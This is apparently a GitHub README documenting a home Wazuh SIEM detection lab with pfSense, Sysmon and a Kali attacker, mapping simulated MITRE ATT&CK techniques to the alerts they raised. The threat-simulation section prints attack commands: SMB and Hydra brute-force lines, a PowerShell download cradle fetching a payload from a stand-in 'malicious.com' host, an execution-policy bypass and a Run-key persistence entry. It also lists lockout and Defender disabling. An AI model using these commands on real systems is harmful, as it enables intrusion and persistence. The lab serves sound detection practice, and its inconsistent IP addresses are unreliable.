# 🛡️ SIEM Detection Lab: Wazuh Implementation

Comprehensive documentation of a virtualized Security Operations Center (SOC) environment implementing Wazuh SIEM for threat detection and security monitoring. This lab demonstrates enterprise security monitoring capabilities, adversary emulation, and incident detection patterns.

## 📋 Table of Contents
- [Project Overview](#project-overview)
- [Infrastructure Architecture](#infrastructure-architecture)
- [Environment Configuration](#environment-configuration)
- [Threat Simulation Results](#threat-simulation-results)
- [Detection Coverage](#detection-coverage)
- [Key Findings](#key-findings)
- [Technical Challenges](#technical-challenges)
- [Future Enhancements](#future-enhancements)

## 🎯 Project Overview

This project documents the deployment and testing of a Wazuh SIEM solution in a controlled lab environment. The infrastructure enables real-time security monitoring, threat detection, and incident response capabilities across Windows endpoints.

**Objectives Achieved:**
- Deployed production-grade SIEM infrastructure using Wazuh 4.7
- Implemented comprehensive endpoint logging with Sysmon integration
- Validated detection coverage across MITRE ATT&CK framework techniques
- Documented detection effectiveness for common attack patterns
- Established baseline security monitoring capabilities

**Environment**: Proxmox virtualized infrastructure with isolated network segments

## 🏗️ Infrastructure Architecture

```
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Proxmox Hypervisor                                    │
├─────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                         │
│  [vmbr0 - Management]           [vmbr1 - Production]              [vmbr2 - Attacker]    │
│  Subnet: 192.168.1.0/24         Subnet: 10.0.0.1/24               Subnet: 10.0.5.0/24 │
│                                                                                         │
│  ┌──────────────────┐           ┌──────────────────┐              ┌──────────────────┐  │
│  │  Wazuh Manager   │           │     pfSense      │              │    Kali Linux    │  │
│  │  (192.168.1.212)   │◄──(Log)───┤    (Gateway)     ├─────────────►│   (10.0.5.10)   │  │
│  └──────────────────┘           └────────┬─────────┘              └──────────────────┘  │
│                                          │                                              │
│                         ┌────────────────┴────────────────┐                             │
│                         │        Internal Domain          │                             │
│                         ├─────────────────────────────────┤                             │
│                         │ ┌──────────────┐ ┌────────────┐ │                             │
│                         │ │Windows Server│ │ Windows 10 │ │                             │
│                         │ │ (10.0.0.4)   │ │ (10.0.0.2) │ │                             │
│                         │ └──────┬───────┘ └─────┬──────┘ │                             │
│                         └────────┼───────────────┼────────┘                             │
│                                  └───────┬───────┘                                      │
│                                          ▼                                              │
│                                 (Active Directory)                                      │
└─────────────────────────────────────────────────────────────────────────────────────────┘
```



### Infrastructure Components

| Component | Specifications | Role | IP Assignment |
|-----------|---------------|------|---------------|
| Wazuh Manager | Ubuntu Server 22.04, 8GB RAM, 4 vCPU, 50GB | SIEM platform, log aggregation, alerting | Static IP | 192.168.1.212
| Windows Endpoint | Windows 10/11 Pro, 4GB RAM, 2 vCPU, 60GB | Monitored target, log generation | DHCP | 10.0.0.2
| Windows Server 2022| Windows 2022 Server, 8GB RAM, 2vCPU, 50GB | Domain Controller (lab.local), DNS, DHCP | DHCP | 10.0.0.4
| Kali Linux | Kali 2025.3, 2GB RAM, 2 vCPU, 40GB | Adversary simulation platform | DHCP/Static | 192.168.1.202
| pfSense | pfSense 2.8.1, 1GB RAM, 1vCPU, 32GB | Stateful Firewall & Inter-VLAN Routing | Static IP | 192.168.1.213, 10.0.0.1

### Network Configuration

- **Network Type**: Bridged (vmbr0, vmbr1,vmbr2)
- **Subnet**: 192.168.1.0/24, 10.0.0.0/24, 10.0.5.0/24
- **Isolation**: Lab traffic is isolated from host network, with further isolation for attacker network
- **Firewall**: pfSense

**SIEM Server Hardware Configuration**
<img width="1013" height="138" alt="image" src="https://github.com/user-attachments/assets/ccf3028d-abb1-4308-ba1d-005925611c33" />

**Kali Linux Hardware Configuration**
<img width="1016" height="154" alt="image" src="https://github.com/user-attachments/assets/e28c7249-bef3-4317-bb95-557de4aabe84" />

**Windows Hardware Configuration**
<img width="1012" height="200" alt="image" src="https://github.com/user-attachments/assets/52b17849-cee9-4e5d-bcb9-8c39ce46b45a" />

**pfSense Hardware Configuration**
<img width="793" height="275" alt="image" src="https://github.com/user-attachments/assets/07d18a2d-bac1-49ea-89f7-b783200949b1" />


## 📥 Environment Configuration

### Wazuh SIEM Deployment

**Platform**: All-in-one deployment (Manager, Indexer, Dashboard)
**Version**: Wazuh 4.7.x


**Configuration Notes:**
- Default admin credentials generated during installation
- Dashboard accessible via HTTPS on port 443
- Agent communication configured on port 1514/TCP
- Self-signed certificates used (lab environment)

<img width="1012" height="501" alt="image" src="https://github.com/user-attachments/assets/968f49ac-617c-466b-8412-69f48c031d13" />

### Network Configuration & Gateway (pfSense)

**Role: Central Security Gateway, DHCP Server, and Inter-VLAN Router.**

To achieve enterprise-grade isolation, the environment utilizes a virtualized pfSense firewall to manage three distinct network zones. This setup ensures that the attacker (Kali) cannot reach the host machine or the home network while allowing for granular logging of inter-zone traffic.

1. **Interface & Zone Mapping**

The pfSense instance is configured with multiple virtual NICs mapped to Proxmox bridges:

    WAN (vmbr0): Provides internet connectivity and allows the Wazuh Manager to receive external updates.

    LAN (vmbr1): The "Production" zone hosting the Windows Server 2022 (Domain Controller) and Windows Workstations.

    OPT1 (vmbr2): The "Attacker" zone hosting the Kali Linux VM. This zone is logically isolated to prevent lateral movement outside of the lab.


<img width="1009" height="542" alt="image" src="https://github.com/user-attachments/assets/d2b92c37-c491-44d1-8558-c42842ca0be2" />


2. **Firewall Security Logic**

Traffic flow is controlled by strict firewall rules to simulate a corporate environment:

    ICMP Monitoring: Explicitly enabled logging on all Ping/ICMP rules. This allows for the detection of network discovery and reconnaissance in the Wazuh dashboard.


<img width="1014" height="549" alt="image" src="https://github.com/user-attachments/assets/d6baed85-a949-46bf-aaac-4aea7a5629f1" />


    Identity Services: Rules allow only specific ports (LDAP: 389, Kerberos: 88, DNS: 53) between the Workstation and the Domain Controller.

    
<img width="1015" height="545" alt="image" src="https://github.com/user-attachments/assets/aae68c86-b9a3-4e5f-bfdd-f769784e2b08" />
    
   
    Attack Isolation: A "Block All" rule is enforced on the Attacker interface to prevent Kali from accessing the management network or the physical Proxmox host.


<img width="1009" height="538" alt="image" src="https://github.com/user-attachments/assets/a342a3ab-c6d2-4cd5-9462-94e307fda3f5" />


3. **SIEM Log Integration (Syslog)**

pfSense is configured to forward network-layer telemetry to the Wazuh Manager via Remote Syslog (UDP 514). This provides the SOC with visibility into:

    Firewall "Deny" events (Potential unauthorized access attempts).

    DHCP Leases (Tracking new devices on the network).

    NAT translation tables.


<img width="1011" height="540" alt="image" src="https://github.com/user-attachments/assets/4c21e8b2-0186-41c0-b63e-09faa7218a98" />


4. **Wazuh Manager Configuration (ossec.conf)**

```XML
<remote>
  <connection>syslog</connection>
  <port>514</port>
  <protocol>udp</protocol>
  <allowed-ips>10.0.0.1/24</allowed-ips> </remote>
```

### Windows Endpoint Configuration

**Logging Enhancement Strategy:**

1. **Sysmon Implementation** (SwiftOnSecurity configuration)
   - Process creation monitoring (Event ID 1)
   - Network connections (Event ID 3)
   - Process access/LSASS monitoring (Event ID 10)
   - Registry modifications (Event ID 13)
   - File creation monitoring (Event ID 11)

2. **PowerShell Script Block Logging**
   - Captures all PowerShell commands executed
   - Critical for detecting malicious scripts
   - Configured via Group Policy / Registry

3. **Wazuh Agent Configuration**
   ```xml
   <localfile>
     <location>Microsoft-Windows-Sysmon/Operational</location>
     <log_format>eventchannel</log_format>
   </localfile>
   ```

4. **Security Hardening Modifications (Lab Only)**
   - Account lockout policy disabled (`net accounts /lockoutthreshold:0`)
   - Remote admin share access enabled (LocalAccountTokenFilterPolicy)
   - Windows Defender temporarily disabled for testing

<img width="1010" height="497" alt="image" src="https://github.com/user-attachments/assets/a031259d-e40d-4714-ac81-755c8bb02ce9" />
<img width="1011" height="631" alt="image" src="https://github.com/user-attachments/assets/22557e2a-19e7-4f2b-ad9b-b0743c961474" />

### Kali Linux Attack Platform

**Tools Installed:**
- Nmap (network reconnaissance)
- Hydra (credential brute-forcing)
- Metasploit Framework (exploitation)
- CrackMapExec (lateral movement simulation)
- smbclient (SMB enumeration)

**Network Configuration:**
- Same subnet as target endpoint
- Static IP assigned for consistent logging
- Full internet access for tool updates

🛠️ Enterprise Hardening & GPO

To simulate a production-hardened environment, I implemented the following via Group Policy Objects (GPOs):

- Legacy Protocol Decommissioning: Disabled LLMNR and NetBIOS across the domain to mitigate broadcast-based credential harvesting (e.g., Responder attacks).

- Advanced Security Auditing: Enabled granular Process Creation logging (Event ID 4688) with Command-Line telemetry included.

- PowerShell Visibility: Forced Script Block Logging across the domain to ensure Wazuh visibility into obfuscated scripts.
    
## ⚔️ Threat Simulation Results

### Test Methodology

Adversary techniques were simulated following the MITRE ATT&CK framework across multiple tactics: Reconnaissance, Initial Access, Execution, Persistence, Credential Access, and Lateral Movement. Each technique was executed from the Kali Linux platform against the Windows endpoint.



### 1. Brute Force Attack (T1110)

**Technique**: Password Guessing against SMB and RDP

**Implementation:**
```bash
# SMB brute force
for i in {1..10}; do
  smbclient //192.168.1.199/C$ -U Administrator%WrongPassword$i
  sleep 2
done

# RDP brute force
hydra -l Administrator -P passwords.txt rdp://192.168.1.199 -t 1
```

**Detection Results:**
- ✅ **Rule 60122**: Multiple Windows authentication failures
- ✅ **Event ID 4625**: Failed logon attempts (Type 3 for SMB, Type 10 for RDP)
- ✅ Source IP correctly identified in alerts
- Detection rate: 100%

<img width="1009" height="558" alt="image" src="https://github.com/user-attachments/assets/8956bc13-b683-44cd-a464-c249275328d8" />
<img width="1011" height="540" alt="image" src="https://github.com/user-attachments/assets/f70b5c77-866d-40b4-9b75-f87028359898" />
<img width="1014" height="576" alt="image" src="https://github.com/user-attachments/assets/685c40a2-605a-4b3d-996e-4df85de2c3b4" />

**Challenge Encountered**: 
- Account lockout policy triggered after default threshold (5 attempts)
- Required disabling lockout for continued testing: `net accounts /lockoutthreshold:0`
- RDP module in Hydra experienced connection instability

---

### 2. PowerShell Execution (T1059.001)

**Technique**: Command and Scripting Interpreter - PowerShell

**Implementation:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
powershell -encodedcommand "dwBoAG8AYQBtAGkA"
powershell -ExecutionPolicy Bypass -Command "Get-Process"
```

**Detection Results:**
- ✅ **Rule 91816**: Suspicious PowerShell script detected
- ✅ Script Block Logging captured full command text
- ✅ Download cradle pattern recognized
- ✅ Encoded command execution flagged
- Detection rate: 100%

<img width="796" height="497" alt="image" src="https://github.com/user-attachments/assets/fb39ddd3-b823-4e11-950b-d4feb5b19943" />
<img width="1016" height="499" alt="image" src="https://github.com/user-attachments/assets/4671c606-f6d1-404e-99fe-f0077089f72d" />
<img width="797" height="493" alt="image" src="https://github.com/user-attachments/assets/96eeda14-dda8-489b-bdd7-eb399be8e650" />


**Key Finding**: PowerShell logging is critical. Without Script Block Logging enabled, command content would be invisible to SIEM.

---



### 3. Persistence - Registry Run Keys (T1547.001)

**Technique**: Boot or Logon Autostart Execution - Registry Run Keys

**Implementation:**
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d "C:\evil.exe"
```

**Detection Results:**
- ✅ **Sysmon Event ID 13**: Registry value set detected
- ✅ Run key modification flagged
- ✅ Value name and data captured in logs
- Detection rate: High

<img width="794" height="498" alt="image" src="https://github.com/user-attachments/assets/01ec3131-528b-40d0-a046-e3c11ca89943" />
<img width="1011" height="470" alt="image" src="https://github.com/user-attachments/assets/c5f07f13-d570-4676-9e19-e7c260246242" />


## 🧠 Technical Challenges & Solutions

**The DNS "Chicken & Egg" Problem**: Encountered a conflict where workstations could not resolve the Domain Controller while using pfSense for internet access.

        Solution: Pointed workstation DNS to the DC and configured DNS Forwarders on the Server to route external queries back to the pfSense gateway.

**Stateful Logging**: pfSense does not log "Pass" events by default.

        Solution: Manually enabled logging on specific ICMP and LDAP firewall rules to ensure the Wazuh SIEM received full network-layer telemetry.


